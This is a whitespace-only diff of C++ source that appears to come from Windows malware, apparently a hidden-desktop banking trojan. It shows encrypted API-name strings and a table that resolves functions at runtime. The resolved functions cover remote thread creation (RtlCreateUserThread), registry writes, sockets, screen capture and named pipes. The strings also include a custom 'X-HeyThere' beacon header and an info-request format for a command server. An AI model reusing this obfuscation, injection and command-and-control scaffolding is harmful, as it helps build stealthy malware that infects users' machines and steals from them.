@@ -3,7 +3,7 @@
 
 namespace Funcs
 {
-   Types::T_CloseHandle                    pCloseHandle;                          
+   Types::T_CloseHandle                    pCloseHandle;
    Types::T_MessageBox                     pMessageBoxA;
    Types::T_GetWindowsDirectory            pGetWindowsDirectoryA;
    Types::T_WideCharToMultiByte            pWideCharToMultiByte;
@@ -203,7 +203,7 @@ namespace Strs
    const char *loadLibraryA;
    const char *getProcAddress;
    const char *pathRemoveFileSpecA;
-   const char *getModuleFileNameA;    
+   const char *getModuleFileNameA;
    const char *pathFindFileNameA;
    const char *strncmp;
    const char *strnicmp;
@@ -216,7 +216,7 @@ namespace Strs
    const char *getVolumeInformationA;
    const char *getUserNameExA;
    const char *lookupAccountNameA;
-   const char *convertSidToStringSidA; 
+   const char *convertSidToStringSidA;
    const char *localFree;
    const char *memcpy;
    const char *lstrcmpiA;
@@ -348,12 +348,12 @@ namespace Strs
    const char *findFirstFileA;
    const char *findNextFileA;
 
-   const char *rtlInitAnsiString;           
-   const char *rtlAnsiStringToUnicodeString;     
+   const char *rtlInitAnsiString;
+   const char *rtlAnsiStringToUnicodeString;
    const char *ldrLoadDll;
    const char *ldrGetProcedureAddress;
    const char *rtlFreeUnicodeString;
-   const char *rtlCreateUserThread;                                                  
+   const char *rtlCreateUserThread;
 
    const char *helloWorld;
    const char *exeExt;
@@ -665,8 +665,8 @@ void InitApi()
    Strs::printWindow                    = ENC_STR_A"PrintWindow"END_ENC_STR;
    Strs::getTopWindow                   = ENC_STR_A"GetTopWindow"END_ENC_STR;
 
-   Strs::rtlInitAnsiString            = ENC_STR_A"RtlInitAnsiString"END_ENC_STR;           
-   Strs::rtlAnsiStringToUnicodeString = ENC_STR_A"RtlAnsiStringToUnicodeString"END_ENC_STR;     
+   Strs::rtlInitAnsiString            = ENC_STR_A"RtlInitAnsiString"END_ENC_STR;
+   Strs::rtlAnsiStringToUnicodeString = ENC_STR_A"RtlAnsiStringToUnicodeString"END_ENC_STR;
    Strs::ldrLoadDll                   = ENC_STR_A"LdrLoadDll"END_ENC_STR;
    Strs::ldrGetProcedureAddress       = ENC_STR_A"LdrGetProcedureAddress"END_ENC_STR;
    Strs::rtlFreeUnicodeString         = ENC_STR_A"RtlFreeUnicodeString"END_ENC_STR;
@@ -730,7 +730,7 @@ void InitApi()
    Strs::fc10 = ENC_STR_A"\r\nLocation: "END_ENC_STR;
    Strs::fc11 = ENC_STR_A"\r\nContent-Length: "END_ENC_STR;
    Strs::fc12 = ENC_STR_A"X-HeyThere: 5eYEp80n3hM"END_ENC_STR;
-  
+
    Strs::headersEnd = ENC_STR_A"\r\n\r\n"END_ENC_STR;
 
    Strs::bu1 = ENC_STR_A"\r\n%s: *\r\n"END_ENC_STR;
@@ -787,7 +787,7 @@ void InitApi()
    Strs::hd14  = ENC_STR_A" -no-remote -profile "END_ENC_STR;
 
    Strs::infoRequest      = ENC_STR_A"info|%d|%d|%d|%d|%s|%s|%d|%d"END_ENC_STR;
-   Strs::pipeName         = ENC_STR_A"\\\\.\\pipe\\%s"END_ENC_STR;  
+   Strs::pipeName         = ENC_STR_A"\\\\.\\pipe\\%s"END_ENC_STR;
    Strs::open             = ENC_STR_A"open"END_ENC_STR;
    Strs::shell_TrayWnd    = ENC_STR_A"Shell_TrayWnd"END_ENC_STR;
    Strs::verclsidExe      = ENC_STR_A"verclsid.exe"END_ENC_STR;
@@ -811,7 +811,7 @@ void InitApi()
    HMODULE hPsapi    = Funcs::pLoadLibraryA(Strs::psapi);
    HMODULE hWininet  = Funcs::pLoadLibraryA(Strs::wininet);
    HMODULE hGdi32    = Funcs::pLoadLibraryA(Strs::gdi32);
-                                           
+
    Funcs::pGetProcAddress                 = (Types::T_GetProcAddress)                 GetProcAddress(hKernel32, Strs::getProcAddress);
    Funcs::pMessageBoxA                    = (Types::T_MessageBox)                     Funcs::pGetProcAddress(hUser32, Strs::messageBoxA);
    Funcs::pGetWindowsDirectoryA           = (Types::T_GetWindowsDirectory)            Funcs::pGetProcAddress(hKernel32, Strs::getWindowsDirectoryA);
@@ -846,10 +846,10 @@ void InitApi()
    Funcs::pStrStrA                        = (Types::T_StrStr)                         Funcs::pGetProcAddress(hShlwapi, Strs::strStrA);
    Funcs::pStrStrIA                       = (Types::T_StrStr)                         Funcs::pGetProcAddress(hShlwapi, Strs::strStrIA);
    Funcs::pStrtol                         = (Types::T_strtol)                         Funcs::pGetProcAddress(hMsvcrt, Strs::strtol);
-   Funcs::pRealloc                        = (Types::T_realloc)                        Funcs::pGetProcAddress(hMsvcrt, Strs::realloc); 
+   Funcs::pRealloc                        = (Types::T_realloc)                        Funcs::pGetProcAddress(hMsvcrt, Strs::realloc);
    Funcs::pWSAStartup                     = (Types::T_WSAStartup)                     Funcs::pGetProcAddress(hWs2_32, Strs::wsaStartup);
-   Funcs::pSocket                         = (Types::T_socket)                         Funcs::pGetProcAddress(hWs2_32, Strs::socket);  
-   Funcs::pGethostbyname                  = (Types::T_gethostbyname)                  Funcs::pGetProcAddress(hWs2_32, Strs::gethostbyname);     
+   Funcs::pSocket                         = (Types::T_socket)                         Funcs::pGetProcAddress(hWs2_32, Strs::socket);
+   Funcs::pGethostbyname                  = (Types::T_gethostbyname)                  Funcs::pGetProcAddress(hWs2_32, Strs::gethostbyname);
    Funcs::pHtons                          = (Types::T_htons)                          Funcs::pGetProcAddress(hWs2_32, Strs::htons);
    Funcs::pConnect                        = (Types::T_connect)                        Funcs::pGetProcAddress(hWs2_32, Strs::connect);
    Funcs::pSend                           = (Types::T_send)                           Funcs::pGetProcAddress(hWs2_32, Strs::send);
@@ -860,7 +860,7 @@ void InitApi()
    Funcs::pSleep                          = (Types::T_Sleep)                          Funcs::pGetProcAddress(hKernel32, Strs::sleep);
    Funcs::pNtOpenKey                      = (Types::T_NtOpenKey)                      Funcs::pGetProcAddress(hNtdll, Strs::ntOpenKey);
    Funcs::pNtSetValueKey                  = (Types::T_NtSetValueKey)                  Funcs::pGetProcAddress(hNtdll, Strs::ntSetValueKey);
-   Funcs::pCloseHandle                    = (Types::T_CloseHandle)                    Funcs::pGetProcAddress(hKernel32, Strs::closeHandle);   
+   Funcs::pCloseHandle                    = (Types::T_CloseHandle)                    Funcs::pGetProcAddress(hKernel32, Strs::closeHandle);
    Funcs::pRtlCreateUserThread            = (Types::T_RtlCreateUserThread)            Funcs::pGetProcAddress(hNtdll, Strs::rtlCreateUserThread);
    Funcs::pCreateProcessA                 = (Types::T_CreateProcess)                  Funcs::pGetProcAddress(hKernel32, Strs::createProcessA);
    Funcs::pInitializeCriticalSection      = (Types::T_InitializeCriticalSection)      Funcs::pGetProcAddress(hKernel32, Strs::initializeCriticalSection);
@@ -887,10 +887,10 @@ void InitApi()
    Funcs::pExpandEnvironmentStringsA      = (Types::T_ExpandEnvironmentStrings)       Funcs::pGetProcAddress(hKernel32, Strs::expandEnvironmentStringsA);
    Funcs::pGetPrivateProfileSectionNamesA = (Types::T_GetPrivateProfileSectionNames)  Funcs::pGetProcAddress(hKernel32, Strs::getPrivateProfileSectionNamesA);
    Funcs::pGetPrivateProfileStringA       = (Types::T_GetPrivateProfileString)        Funcs::pGetProcAddress(hKernel32, Strs::getPrivateProfileStringA);
-   Funcs::pCreateFileA                    = (Types::T_CreateFile)                     Funcs::pGetProcAddress(hKernel32, Strs::createFileA);  
+   Funcs::pCreateFileA                    = (Types::T_CreateFile)                     Funcs::pGetProcAddress(hKernel32, Strs::createFileA);
    Funcs::pReadFile                       = (Types::T_ReadFile)                       Funcs::pGetProcAddress(hKernel32, Strs::readFile);
    Funcs::pWriteFile                      = (Types::T_WriteFile)                      Funcs::pGetProcAddress(hKernel32, Strs::writeFile);
-   Funcs::pRegSetValueExA                 = (Types::T_RegSetValueEx)                  Funcs::pGetProcAddress(hAdvapi32, Strs::regSetValueExA);   
+   Funcs::pRegSetValueExA                 = (Types::T_RegSetValueEx)                  Funcs::pGetProcAddress(hAdvapi32, Strs::regSetValueExA);
    Funcs::pRegOpenKeyExA                  = (Types::T_RegOpenKeyEx)                   Funcs::pGetProcAddress(hAdvapi32, Strs::regOpenKeyExA);
    Funcs::pRegCloseKey                    = (Types::T_RegCloseKey)                    Funcs::pGetProcAddress(hAdvapi32, Strs::regCloseKey);
    Funcs::pGetFileSize                    = (Types::T_GetFileSize)                    Funcs::pGetProcAddress(hKernel32, Strs::getFileSize);
@@ -953,7 +953,7 @@ void InitApi()
    Funcs::pDeleteObject                   = (Types::T_DeleteObject)                   Funcs::pGetProcAddress(hGdi32, Strs::deleteObject);
    Funcs::pGetDIBits                      = (Types::T_GetDIBits)                      Funcs::pGetProcAddress(hGdi32, Strs::getDiBits);
    Funcs::pStretchBlt                     = (Types::T_StretchBlt)                     Funcs::pGetProcAddress(hGdi32, Strs::stretchBlt);
-   Funcs::pSetStretchBltMode              = (Types::T_SetStretchBltMode)              Funcs::pGetProcAddress(hGdi32, Strs::setStretchBltMode);                                                             
+   Funcs::pSetStretchBltMode              = (Types::T_SetStretchBltMode)              Funcs::pGetProcAddress(hGdi32, Strs::setStretchBltMode);
    Funcs::pSelectObject                   = (Types::T_SelectObject)                   Funcs::pGetProcAddress(hGdi32, Strs::selectObject);
    Funcs::pCreateCompatibleDC             = (Types::T_CreateCompatibleDC)             Funcs::pGetProcAddress(hGdi32, Strs::createCompatibleDc);
    Funcs::pCreateCompatibleBitmap         = (Types::T_CreateCompatibleBitmap)         Funcs::pGetProcAddress(hGdi32, Strs::createCompatibleBitmap);
